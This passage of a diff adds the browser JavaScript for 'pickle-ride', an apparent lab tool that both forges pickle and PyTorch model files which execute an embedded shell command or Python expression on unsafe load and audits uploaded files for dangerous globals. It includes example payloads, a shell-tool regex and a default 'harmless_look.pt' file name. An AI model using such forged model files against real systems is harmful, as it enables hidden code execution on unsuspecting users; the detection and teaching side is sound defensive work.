+  $("back").hidden = v === "home";
+  document.title = TITLES[v];
+  scrollTo(0, 0);
+}
+addEventListener("hashchange", route);
+document.querySelectorAll("[data-go]").forEach(b => b.onclick = () => location.hash = b.dataset.go);
+$("back").onclick = () => location.hash = "";
+route();
+
+/* ── engine boot ── */
+let pyodide = null, api = null, bootResolve, bootReject, engineFailed = false;
+const boot = new Promise((res, rej) => { bootResolve = res; bootReject = rej; });
+boot.catch(() => {});
+function pill(txt, cls) { const p = $("engine"); p.textContent = "engine: " + txt; p.className = "pill " + cls; }
+(async () => {
+  try {
+    pill("downloading runtime…", "warn");
+    pyodide = await loadPyodide();
+    pill("loading lab module…", "warn");
+    await pyodide.runPythonAsync($("py").textContent);
+    const g = n => pyodide.globals.get(n);
+    api = { forge: g("forge"), wrap: g("wrap"), audit: g("audit"), detonate: g("detonate") };
+    pill("ready ✓", "ok");
+    bootResolve(pyodide);
+  } catch (e) {
+    engineFailed = true;
+    pill("failed — tap to retry", "bad");
+    bootReject(e);
+  }
+})();
+$("engine").onclick = () => { if (engineFailed) location.reload(); };
+
+/* ── progress ── */
+function progress(id) {
+  const w = $(id), bar = w.querySelector(".fill"), lab = w.querySelector(".plabel");
+  bar.style.width = "0%"; w.hidden = false;
+  return async (pct, label) => { lab.textContent = label; bar.style.width = pct + "%"; await tick(); };
+}
+
+/* ── findings + recovered calls ── */
+function renderFindings(el, a) {
+  el.innerHTML = "";
+  for (const c of (a.calls || []).filter(c => c.dangerous)) {
+    const box = document.createElement("div"); box.className = "cmdbar";
+    const head = document.createElement("div"); head.className = "h";
+    const title = document.createElement("span");
+    const isPy = c.module === "builtins" && (c.name === "eval" || c.name === "exec");
+    title.textContent = (isPy ? "🐍 " : "💀 ") + c.module + "." + c.name + "() will run " + (isPy ? "(Python):" : "(shell):");
+    const cp = document.createElement("span"); cp.className = "cp"; cp.textContent = "copy";
+    const pre = document.createElement("pre");
+    pre.textContent = c.args.length ? c.args.join("\n") : "(no arguments recovered)";
+    cp.onclick = async () => { try { await navigator.clipboard.writeText(pre.textContent); toast("copied ✓"); } catch (e) {} };
+    head.append(title, cp); box.append(head, pre); el.appendChild(box);
+  }
+  if (!a.findings.length) { el.insertAdjacentHTML("beforeend", '<span class="chip dim">no globals found</span>'); return; }
+  for (const f of a.findings) {
+    const c = document.createElement("span");
+    c.className = "chip " + (f.dangerous ? "bad" : "info");
+    c.textContent = (f.dangerous ? "💀 " : "ℹ️ ") + f.module + "." + f.name + " @" + f.pos;
+    el.appendChild(c);
+  }
+}
+
+/* ── kind-aware command UI ── */
+function validateCmd() {
+  const k = $("kind").value, v = $("cmd").value.trim();
+  const shellish = /^(touch|echo|ls|cat|curl|wget|rm|mkdir|whoami|id|uname|pwd|powershell|cmd|bash|sh|nc|python|pip)\b/i.test(v);
+  const warn = $("cmd-warn");
+  if (k === "eval" && shellish && !/[()=]/.test(v)) {
+    warn.textContent = "⚠ This looks like a shell command. builtins.eval expects a Python expression — switch the target to posix.system / nt.system, or write Python.";
+    warn.hidden = false;
+  } else warn.hidden = true;
+}
+function updateKindUI() {
+  const isEval = $("kind").value === "eval";
+  $("cmd-label").textContent = isEval ? "Python expression to evaluate on insecure load" : "Shell command to execute on insecure load";
+  const chip = $("mode-chip");
+  chip.textContent = isEval ? "PYTHON · builtins.eval" : "SHELL · os.system";
+  chip.className = "modechip " + (isEval ? "py" : "sh");
+  $("cmd-hint").innerHTML = isEval
+    ? 'A single Python <b>expression</b> (eval, not exec). Example: <code>__import__(\'pathlib\').Path(\'PWNED.txt\').write_text(\'hi\')</code>. Shell syntax like <code>touch x</code> raises SyntaxError. This runs as real Python inside the WASM sandbox.'
+    : 'Runs through the OS shell on the target. In the WASM sandbox <code>system()</code> is stubbed (no fork/exec) — use a Python preset to see a live effect here.';
+  $("cmd").placeholder = isEval ? "__import__('pathlib').Path('PWNED.txt').write_text('pwned')" : "touch YOU_HAVE_BEEN_PWNED";
+  validateCmd();
+}
+$("kind").addEventListener("change", updateKindUI);
+$("cmd").addEventListener("input", validateCmd);
+$("preset").onchange = e => {
+  if (!e.target.value) { return; }
+  const i = e.target.value.indexOf("|");
+  $("kind").value = e.target.value.slice(0, i);
+  $("cmd").value = e.target.value.slice(i + 1);
+  updateKindUI();
+};
+
+/* ── filename handling ── */
+function syncExt() {
+  const ext = EXT[$("fmt").value];
+  let v = $("fname").value.trim();
+  if (!v) { $("fname").value = "harmless_look" + ext; return; }
+  v = v.replace(/\.(pt|pkl|pth|bin|ckpt)$/i, "");
+  $("fname").value = v + ext;
+}
+$("fmt").addEventListener("change", syncExt);
+function payloadName() {
+  let n = $("fname").value.trim().replace(/[\/\\:*?"<>|\x00-\x1f]/g, "").slice(0, 120);
+  const ext = EXT[$("fmt").value];
+  if (!n) n = "harmless_look" + ext;
+  if (!/\.[a-z0-9]+$/i.test(n)) n += ext;
+  return n;
+}
+
+/* ── generation flow ── */
+let lastHex = null, lastFmt = "zip", lastFileName = "harmless_look.pt", lastGenMeta = null;
+$("gen").onclick = async () => {
+  const cmd = $("cmd").value.trim();
+  $("gen-err").hidden = true; $("gen-result").hidden = true; $("det-out").hidden = true;
+  if (!cmd) { $("gen-err").textContent = "Enter a command or Python expression to embed first."; $("gen-err").hidden = false; return; }
+  $("gen").disabled = true;
+  const p = progress("gen-prog");
+  try {
+    await p(8, "step 1/4 · waiting for CPython engine…"); await boot;
+    await p(30, "step 2/4 · assembling pickle opcodes…");
+    const pkl = api.forge(cmd, $("kind").value);
+    lastFmt = $("fmt").value;
+    lastFileName = payloadName();
+    await p(55, "step 3/4 · wrapping " + FMT_LABEL[lastFmt] + " container…");
+    const meta = JSON.parse(api.wrap(pkl, lastFmt));
+    await p(80, "step 4/4 · static self-audit + SHA-256…");
+    const a = JSON.parse(api.audit(meta.hex));
+    await p(100, "done — " + meta.size + " bytes forged");
+    lastHex = meta.hex; lastGenMeta = meta;
+    $("r-size").textContent = meta.size;
+    $("r-fmt").textContent = FMT_LABEL[lastFmt];
+    $("r-name").textContent = lastFileName;
+    $("r-sha").textContent = "sha256: " + meta.sha256 + "  📋";
+    renderFindings($("r-findings"), a);
+    $("r-disasm").textContent = a.ok ? a.disasm : a.error;
+    $("gen-result").hidden = false;
+    toast("payload forged ✓");
+  } catch (e) {
+    $("gen-err").textContent = "Generation failed: " + e; $("gen-err").hidden = false;
+  } finally { $("gen").disabled = false; }
+};
+$("r-sha").onclick = async () => {
+  if (!lastGenMeta) return;
+  try { await navigator.clipboard.writeText(lastGenMeta.sha256); toast("SHA-256 copied ✓"); } catch (e) {}
+};
+$("dl").onclick = () => {
+  download(hexToBytes(lastHex), lastFileName);
+  toast("download started · " + lastFileName);
+};
+$("det").onclick = async () => {
+  $("det").disabled = true; await tick(60);
+  const out = $("det-out"); out.hidden = false;
+  out.textContent = "🧪 SANDBOX DETONATION (WASM jail)\n" + api.detonate(lastHex);
+  $("det").disabled = false;
+};
+$("open-ana").onclick = () => {
+  location.hash = "#/analyze";
+  analyzeHex(lastHex, lastFileName, lastGenMeta.size);
+};
+
+/* ── analysis flow ── */
+let lastAudit = null, lastFileMeta = null;
+async function runAudit(hex, name, size, p) {
+  await p(72, "step 2/3 · disassembling opcodes — static, no execution…");
+  const a = JSON.parse(api.audit(hex));
+  await p(100, "step 3/3 · analysis complete");
+  lastAudit = a; lastFileMeta = { name, size };
+  $("a-name").textContent = name; $("a-size").textContent = fmtSize(size);
+  const v = $("verdict");
+  if (!a.ok) {
+    v.className = "banner warnb"; v.textContent = "⚠️ Could not parse as pickle: " + a.error;
+    $("a-findings").innerHTML = ""; $("a-disasm").textContent = "";
+  } else if (a.verdict === "unsafe") {
+    v.className = "banner bad";
+    v.textContent = "💀 MALICIOUS — this file runs code only if loaded unsafely: pickle.load() or torch.load(..., weights_only=False). Execution is the loader's choice — torch ≥ 2.6 defaults to weights_only=True, which blocks this payload.";
+    renderFindings($("a-findings"), a); $("a-disasm").textContent = a.disasm;
+  } else {
+    v.className = "banner okb";
+    v.textContent = "✅ No known-dangerous globals (" + a.container + "). Heuristic scan — not a guarantee of safety.";
+    renderFindings($("a-findings"), a); $("a-disasm").textContent = a.disasm;
+  }
+  $("ana-result").hidden = false;
+}
+async function analyzeHex(hex, name, size) {
+  $("ana-result").hidden = true;
+  const p = progress("ana-prog");
+  try {
+    await p(40, "step 1/3 · waiting for CPython engine…"); await boot;
+    await runAudit(hex, name, size, p);
+  } catch (e) {
+    $("ana-result").hidden = false;
+    $("a-name").textContent = name; $("a-size").textContent = fmtSize(size);
+    $("verdict").className = "banner warnb"; $("verdict").textContent = "⚠️ " + e.message;
+    $("a-findings").innerHTML = ""; $("a-disasm").textContent = "";
+    lastAudit = null;
+  }
+}
+async function analyzeFile(file) {
+  if (!file) return;
+  $("ana-result").hidden = true;
+  if (file.size > MAX_BYTES) {
+    $("ana-prog").hidden = true; $("ana-result").hidden = false;
+    $("a-name").textContent = file.name; $("a-size").textContent = fmtSize(file.size);
+    $("verdict").className = "banner warnb";
+    $("verdict").textContent = "⚠️ File too large for the in-browser lab (64 MB cap). Tip: a .pt is a ZIP — unzip it and upload just data.pkl.";
+    $("a-findings").innerHTML = ""; $("a-disasm").textContent = ""; lastAudit = null;
+    $("file").value = ""; return;
+  }
+  const p = progress("ana-prog");
+  try {
+    await p(15, "reading " + file.name + "…");
+    const hex = toHex(await file.arrayBuffer());
+    await p(40, "step 1/3 · waiting for CPython engine…"); await boot;
+    await runAudit(hex, file.name, file.size, p);
+  } catch (e) {
+    $("ana-result").hidden = false;
+    $("a-name").textContent = file.name; $("a-size").textContent = fmtSize(file.size);
+    $("verdict").className = "banner warnb"; $("verdict").textContent = "⚠️ " + e.message;
+    $("a-findings").innerHTML = ""; $("a-disasm").textContent = ""; lastAudit = null;
+  }
+  $("file").value = "";
+}
+$("file").onchange = e => analyzeFile(e.target.files[0]);
+const drop = $("drop");
+["dragover", "dragenter"].forEach(ev => drop.addEventListener(ev, e => { e.preventDefault(); drop.classList.add("drag"); }));
+["dragleave", "drop"].forEach(ev => drop.addEventListener(ev, e => { e.preventDefault(); drop.classList.remove("drag"); }));
+drop.addEventListener("drop", e => analyzeFile(e.dataTransfer.files[0]));
+drop.addEventListener("keydown", e => { if (e.key === "Enter" || e.key === " ") { e.preventDefault(); $("file").click(); } });
+
+$("export-report").onclick = () => {
+  if (!lastAudit || !lastFileMeta) return;
+  const report = {
+    tool: "pickle-ride", author: "Aryan Giri | giriaryan694-a11y",
+    generatedAt: new Date().toISOString(),
+    file: lastFileMeta.name, sizeBytes: lastFileMeta.size,
+    verdict: lastAudit.ok ? lastAudit.verdict : "parse-error",
+    container: lastAudit.container || null,
+    findings: lastAudit.findings || [], recoveredCalls: lastAudit.calls || [],
+    disassembly: lastAudit.disasm || null, error: lastAudit.error || null
+  };
+  download([JSON.stringify(report, null, 2)], lastFileMeta.name + ".audit.json", "application/json");
+  toast("report exported ✓");
+};
+
+/* ── init ── */
+updateKindUI();
+</script>
+</body>
+</html>
